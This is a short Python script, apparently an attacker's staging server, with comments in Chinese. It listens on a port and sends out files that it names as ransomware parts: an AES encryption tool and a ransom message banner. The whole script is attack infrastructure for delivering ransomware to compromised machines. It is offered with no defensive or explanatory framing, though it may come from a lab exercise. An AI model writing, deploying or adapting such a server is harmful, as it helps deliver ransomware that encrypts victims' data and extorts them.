#!/usr/bin/env python3
import socket
import sys

# 確保命令列提供 Port 參數
if len(sys.argv) != 2:
    print("Usage: ./attack_server.py <Attacker port>")
    sys.exit(1)

PORT = int(sys.argv[1])
HOST = "0.0.0.0"

# 設定可供下載的勒索病毒與訊息
files = {
    "aes-tool": "/app/aes-tool",  # 編譯後的加密工具
    "banner": "/app/banner"  # 勒索訊息
}

def start_server():
    print(f"🔥 攻擊伺服器啟動中 ({HOST}:{PORT})...")
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    server.listen(5)

    while True:
        conn, addr = server.accept()
        print(f"⚡ 來自 {addr} 的請求")
        request = conn.recv(1024).decode().strip()

        if request in files:
            with open(files[request], "rb") as file:
                conn.sendall(file.read())  # 傳送所需的文件
            print(f"📤 傳送 {request} 給 {addr}")
        else:
            conn.sendall(b"ERROR: File not found")

        conn.close()

if __name__ == "__main__":
    start_server()

